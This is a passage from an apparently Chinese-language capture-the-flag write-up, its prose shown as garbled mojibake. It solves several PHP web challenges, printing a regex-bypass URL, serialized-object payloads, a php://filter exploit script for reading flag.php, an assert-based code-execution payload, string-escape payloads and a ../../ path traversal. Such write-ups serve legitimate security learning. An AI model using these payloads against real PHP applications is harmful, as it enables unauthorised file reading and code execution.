class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°<code>Congratulations! The flag is: &#39; . FLAG</code>ä½†æ˜¯ä»”ç»†æŸ¥çœ‹ï¼Œå‘ç°è¦ä½¿æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å®Œå®Œå…¨å…¨ä¸random_bytes(64)ç›¸ç­‰ï¼Œæ˜¾ç„¶éš¾åº¦éå¸¸å¤§ï¼Œæˆ‘ä»¬æ¢æ¡è·¯ã€‚</p>
<p>æœ‰å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<p>&#x3D;&#x3D;$_SERVER[â€˜PHP_SELFâ€™]&#x3D;&#x3D;ï¼šè¡¨ç¤ºå½“å‰ php æ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. http://www.5idev.com/php/   						/php/index.php</span><br><span class="line">2. http://www.5idev.com/php/index.php 				/php/index.php</span><br><span class="line">3. http://www.5idev.com/php/index.php?test=foo  	/php/index.php</span><br><span class="line">4. http://www.5idev.com/php/index.php/test/foo  	/php/index.php/test/foo</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;basename&#x3D;&#x3D;ï¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/testweb/home.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾ç¤ºå¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶å</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>);			<span class="comment">//home.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾ç¤ºä¸å¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶å</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);	<span class="comment">//home</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>flagåœ¨config.phpæ–‡ä»¶ä¸­,ä½†æ˜¯æ­£åˆ™åŒ¹é…æ‰äº†config.php</p>
<p>å½“è®¿é—®index.phpæ—¶ï¼Œå¯ä»¥åœ¨åé¢åŠ ä¸Šä¸€äº›ä¸œè¥¿ï¼Œä¾‹å¦‚&#x2F;index.php&#x2F;config.phpï¼Œè®¿é—®çš„ä»ç„¶æ˜¯index.phpã€‚ä½†ç»è¿‡basename()åï¼Œå°±å˜æˆäº†config.phpï¼Œç„¶åå†é€šè¿‡?sourceè¯»å–ã€‚</p>
<p>å¦‚æœèƒ½ç»•è¿‡æ­£åˆ™ï¼Œå°±å¯ä»¥è®¿é—®config.phpï¼Œè¿›è€Œå¾—åˆ°flag</p>
<p>å¦‚æœæ„é€ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php?souce</span><br></pre></td></tr></table></figure>

<p>æ— æ³•ç»•è¿‡æ­£åˆ™åŒ¹é…</p>
<p>ç”¨ä¸å¯æ˜¾å­—ç¬¦ç»•è¿‡æ­£åˆ™ï¼ˆåé¢åŠ  %80 â€“ %ff çš„ä»»æ„å­—ç¬¦ï¼‰</p>
<p>æ„é€ payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure>







<hr>
<h1 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h1><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h4><p>?select&#x3D;O:4:â€Nameâ€:3:{s:14:â€%00Name%00usernameâ€;s:5:â€adminâ€;s:14:â€%00Name%00passwordâ€;i:100;}</p>
<hr>
<h4 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹åˆ°æœ€åï¼Œéœ€è¦ä¼ å‚strï¼Œç„¶åè½¬ä¸ºå­—ç¬¦ä¸²ï¼Œä¼ å…¥is_validå‡½æ•°æ£€æŸ¥asciiç æ˜¯å¦æ˜¯ä½äº32~125ï¼Œç„¶åååºåˆ—ã€‚</p>
<p>ç„¶åçœ‹destructå‡½æ•°ï¼Œå®ƒä¼šåˆ¤æ–­opå±æ€§å€¼æ˜¯ä¸æ˜¯â€2â€ï¼Œæ˜¯â€2â€å°±æ”¹ä¸ºâ€1â€ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å¼ºæ¯”è¾ƒï¼Œç„¶åè§¦å‘process()å‡½æ•°ã€‚</p>
<p>å‘ç°åœ¨readå‡½æ•°é‡Œæœ‰file_get_contentsè¯»æ–‡ä»¶çš„æ“ä½œï¼Œé‚£æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå‡½æ•°è¯»å–flag.phpæ–‡ä»¶ã€‚</p>
<p>çœ‹åˆ°processå‡½æ•°ï¼Œè¦è§¦å‘readå‡½æ•°ï¼Œå°±è¦ä½¿opçš„å€¼ä¸ºâ€2â€ï¼Œè¿™é‡Œæ˜¯å¼±æ¯”è¾ƒã€‚</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸¤ä¸ªç»†èŠ‚ï¼š</p>
<ol>
<li><p>opçš„å€¼æ˜¯2ï¼Œæ•°æ®ç±»å‹æ˜¯intï¼Œå’Œâ€œ2â€è¿›è¡Œå¼ºæ¯”è¾ƒç»“æœä¸ºå‡ï¼Œä¸â€œ2â€å¼±æ¯”è¾ƒç»“æœä¸ºçœŸï¼Œå®Œç¾ç»•è¿‡ã€‚</p>
</li>
<li><p>protectedæ”¹ä¸ºäº†publicï¼Œè¿™é‡Œæ˜¯å› ä¸ºis_validå‡½æ•°ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œè€Œ%00çš„asciiç æ˜¯0ï¼Œé€šè¿‡ä¸äº†æ£€æŸ¥ï¼Œæ‰€ä»¥ä¸èƒ½å­˜åœ¨ç©ºå­—ç¬¦ä¸²ã€‚</p>
</li>
</ol>
<hr>
<h4 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h4><p>æŸ¥çœ‹æºä»£ç å‘ç°&#x2F;time.php?sourceæ–‡ä»¶ï¼Œè®¿é—®å®ƒã€‚</p>
<p>æ˜¯ä¸€é“ååºåˆ—åŒ–çš„é¢˜ï¼Œå…ˆçœ‹destructå‡½æ•°ï¼Œæœ€ç»ˆä¼šè¾“å‡ºb(a)ï¼Œæ‰€ä»¥è®©å˜é‡bä¸ºsystemï¼Œå˜é‡aä¸ºphpinfoï¼Œè¿™é‡Œsystemè¢«ç¦ç”¨ï¼Œç”¨&#x3D;&#x3D;assert&#x3D;&#x3D;ä»£æ›¿ï¼Œåºåˆ—åŒ–åpayloadï¼š</p>
<p>?data&#x3D;O:8:â€HelloPhpâ€:2:{s:1:â€aâ€;s:9:â€phpinfo()â€;s:1:â€bâ€;s:6:â€assertâ€;}</p>
<p>ctrl+fæŸ¥æ‰¾flag</p>
<hr>
<h4 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h4><p>å­¦åˆ°çš„çŸ¥è¯†ï¼šextractå¯¹sessionæ•°ç»„çš„è¦†ç›–</p>
<p>&#x3D;&#x3D;ååºåˆ—åŒ–é€ƒé€¸&#x3D;&#x3D;çš„æ–¹æ³•</p>
<p>å‚è€ƒé“¾æ¥ï¼š[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/12813992.html">å®‰æ´µæ¯ 2019]easy_serialize_php - LLeaves - åšå®¢å›­ (cnblogs.com)</a></p>
<p>é¦–å…ˆä»£ç å®¡è®¡ï¼Œåœ¨phpinfoæ‰¾åˆ°d0g3_f1ag.phpæ–‡ä»¶</p>
<p>d0g3_f1ag.phpâ€”-base64åŠ å¯†â€”-&gt;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;</p>
<p>&#x2F;d0g3_fllllllagâ€”â€”base64åŠ å¯†â€”â€“&gt;L2QwZzNfZmxsbGxsbGFn</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">#æ–¹æ³•ä¸€</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flagflag&#x27;</span>]=<span class="string">&#x27;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="comment">#ç»“æœ a:1:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;ï¼Œè¿™é‡Œå°±é€ æˆimgä¸æˆä¸ºä¸€ä¸ªé”®ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">    <span class="comment">#è¿‡æ»¤æ‰flagæœ‰</span></span><br><span class="line">    <span class="comment">#a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span></span><br><span class="line">    <span class="comment">#ä½¿å¾—ç»•è¿‡;s:51:&quot;&quot;åˆ°è¾¾ä¸‹ä¸€ä¸ªå°å·ï¼Œè¿™æ—¶imgæˆåŠŸé€ƒé€¸å‡ºæ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#æ–¹æ³•äºŒ</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flagphp&#x27;</span>]=<span class="string">&#x27;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">#æ–¹æ³•ä¸‰</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flagflag&#x27;</span>]=<span class="string">&#x27;&quot;;s:2:&quot;aa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p>&#x3D;&#x3D;ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸&#x3D;&#x3D;</p>
<p><a target="_blank" rel="noopener" href="http://www.zipä¸‹è½½æºç ,è®¿é—®regiest.phpæ³¨å†Œè´¦å·,ç„¶åç™»å½•,ç„¶åä»£ç å®¡è®¡./">www.zipä¸‹è½½æºç ï¼Œè®¿é—®regiest.phpæ³¨å†Œè´¦å·ï¼Œç„¶åç™»å½•ï¼Œç„¶åä»£ç å®¡è®¡ã€‚</a></p>
<p>æ‰“å¼€åï¼Œå¼€å§‹å®¡è®¡ï¼Œåæ­£æˆ‘æ˜¯ä¸ä¼š ã€‚å…¶å®åšçš„é¢˜å¤šäº†ï¼Œä¹Ÿå°±èƒ½å‘ç°ï¼Œæ¥æ¥å›å›ä¹Ÿå°±é‚£å‡ ä¸ªå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥åœ¨config.phpé‡Œçœ‹è§flagï¼Œé‚£æˆ‘ä»¬åªè¦è¯»å–config.phpæ–‡ä»¶å³å¯ï¼Œç„¶åååœ¨profile.phpé‡Œçœ‹è§file_get_contents()å‡½æ•°ã€‚</p>
<p>åŸæ¥çš„åºåˆ—åŒ–ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:â€œphoneâ€;s:11:â€œ11111111111â€;s:5:â€œemailâ€;s:11:â€œ1a2s@qq.comâ€;s:8:â€œnicknameâ€;s:3:â€œ123â€;s:5:â€œphotoâ€;s:39:â€œupload/f3b94e88bd1bd325af6f62828c8785ddâ€;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨nicknameï¼ˆå› ä¸ºnicknameæ˜¯æœ€åä¸€ä¸ªï¼‰é‡ŒåŠ ä¸Š<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> ï¼Œ<code>&quot;;&#125;</code>åé¢çš„éƒ½ä¸ä¼šååºåˆ—åŒ–äº†ï¼Œè¿™æ ·photoå¯¹åº”çš„å€¼ä¹Ÿå°±æ˜¯config.phpäº†ã€‚</p>
<p>åœ¨update.phpé‡Œï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™åŒ¹é…æ§åˆ¶nicknameçš„å€¼ï¼Œç›´æ¥åˆ©ç”¨&#x3D;&#x3D;æ•°ç»„&#x3D;&#x3D;ç»•è¿‡ã€‚</p>
<p>å¦å¤–ï¼Œæˆ‘ä»¬çŸ¥é“<code>where</code>ç­‰å­—ç¬¦ä¼šè¢«<code>hacker</code>æ›¿æ¢ï¼Œä»è€Œå¢åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> é•¿34ä¸ªå­—ç¬¦ï¼Œé‚£æˆ‘ä»¬ä¼ é€’34ä¸ªwhereä½¿åé¢çš„photoé”®å€¼å¯¹é€ƒé€¸å‡ºå»ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nicknameæ”¹ä¸ºnickname[]</span><br><span class="line"></span><br><span class="line">s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h4><p>&#x3D;&#x3D;pharååºåˆ—åŒ–&#x3D;&#x3D;</p>
<p>æ³¨å†Œåç™»å½•ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åç‚¹å‡»ä¸‹è½½ï¼ŒæŠ“åŒ…ï¼Œæ›´æ”¹filenameçš„å€¼ä¸º..&#x2F;..&#x2F;index.phpï¼ŒæˆåŠŸè¯»å–æºä»£ç ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>index.phpã€class.phpã€download.phpã€delete.phpç­‰</p>
<p>index.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†FileListç±»é‡Œé¢çš„Nameå’ŒSizeæ–¹æ³•ã€‚</p>
<p>ä½†æ˜¯class.phpé‡Œé¢çš„FlieListç±»æ²¡æœ‰é‚£ä¸¤ä¸ªæ–¹æ³•ï¼Œä»è€Œè§¦å‘callå‡½æ•°ï¼Œcallå‡½æ•°çš„æ„æ€æ˜¯è°ƒç”¨Fileç±»çš„å¯¹åº”æ–¹æ³•ã€‚</p>
<p>åœ¨Fileç±»é‡Œé¢æœ‰ä¸€ä¸ªcloseæ–¹æ³•ï¼Œé‡Œé¢å¯ä»¥è¯»æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å°±æ˜¯è¦æƒ³åŠæ³•è§¦å‘closeæ–¹æ³•ã€‚</p>
